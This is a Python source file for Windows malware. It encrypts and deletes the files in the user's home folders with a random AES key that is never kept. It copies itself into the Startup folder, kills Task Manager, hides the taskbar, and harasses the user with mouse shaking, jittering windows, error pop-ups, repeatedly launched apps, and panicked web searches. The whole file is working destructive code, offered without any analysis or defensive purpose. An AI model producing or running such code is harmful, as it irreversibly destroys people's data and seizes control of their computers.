import pyautogui
import random
import time
import subprocess
import webbrowser
import pygetwindow as gw
import ctypes
from ctypes import wintypes
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import shutil
import psutil
import sys
import threading


def pad(data):
    while len(data) % 16 != 0:
        data += b' '
    return data


def encrypt_files(key):
    main = os.path.expanduser('~')                                                                                                                                                                                   
    priority = [  
    os.path.join(main, 'Documents'), 
    os.path.join(main, 'Desktop'), 
    os.path.join(main, 'Downloads'),   
    os.getenv('APPDATA')
    ]

    most_useless = [
        os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge')
    ]

    def process_directory(directory):
        for dirpath, dirnames, filenames in os.walk(directory):
            for filename in filenames:
                filename = os.path.join(dirpath, filename)
                try:
                    with open(filename, 'rb') as file:
                        data = file.read()

                    data = pad(data)
                    cipher = AES.new(key, AES.MODE_ECB)
                    ciphertext = cipher.encrypt(data)

                    if ".enc" in filename or os.path.basename(sys.argv[0]) in filename:
                        pass
                    else:
                        print(f"encrypting: {filename}")
                        with open(filename + ".enc", 'wb') as file:
                            file.write(ciphertext)
                        os.remove(filename)
                except:
                    pass

    for path in priority:
        process_directory(path)

    for dirpath, dirnames, filenames in os.walk(main):
        if dirpath not in priority and dirpath not in most_useless:
            process_directory(dirpath)
key = get_random_bytes(16)


def mouse_shaking():
    time.sleep(15)

    pyautogui.FAILSAFE = False
    li = [1, 1] 
    last_update_time = time.time()
    mouse_shaking_coords = lambda li: [x + 1 for x in li]

    while True:
        dx = random.randint(-li[0], li[0])
        dy = random.randint(-li[1], li[1])
        pyautogui.moveRel(dx, dy)

        current_time = time.time()

        if current_time - last_update_time > 10:
            li = mouse_shaking_coords(li)
            last_update_time = current_time


def open_apps():
    global browser_query
    time.sleep(15)

    timer = 15
    while True:
        apps = random.choice(['notepad.exe', 'cmd', 'calc.exe'])

        browser_query = ['what can i do when im afraid?', 'im very scared. what should i do?', 'im so scared someone please help me', 'imscaredhelp']
        url = f"https://www.google.com/search?q={random.choice(browser_query)}"

        subprocess.Popen(apps, shell=True)
        webbrowser.open(url)  

        time.sleep(timer)
        if timer != 1: timer -= 1


def jitter_windows():
    time.sleep(15)

    while True:
        try:
            all_windows = gw.getWindowsWithTitle('')

            for win in all_windows:
                dx = random.randint(-5, 5)
                dy = random.randint(-5, 5)
                win.move(dx, dy)
        except:
            pass


def messages():
    time.sleep(15)

    timer = 15
    while True:
        ctypes.windll.user32.MessageBoxW(0, f'{random.randbytes(111)}', f'{random.randbytes(10)}', 0x00000002 | 0x00000030)
        time.sleep(timer)
        if timer != 1: timer -= 1


def startup():
    main_file = sys.argv[0]
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shutil.copy(main_file, startup_folder)


def hide_taskbar():
    time.sleep(15)

    taskbar_handle = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
    ctypes.windll.user32.ShowWindow(taskbar_handle, 0)


def kill_taskmgr():
    while True:
        try:
            for process in psutil.process_iter(['pid', 'name']):
                if process.info['name'] == "Taskmgr.exe":
                    process.terminate()
        except:
            pass


if __name__ == "__main__":
    threading.Thread(target=kill_taskmgr).start()
    threading.Thread(target=startup).start()
    threading.Thread(target=hide_taskbar).start()
    threading.Thread(target=open_apps).start()
    threading.Thread(target=messages).start()
    threading.Thread(target=jitter_windows).start()
    threading.Thread(target=mouse_shaking).start()
    threading.Thread(target=encrypt_files, args=(key,)).start()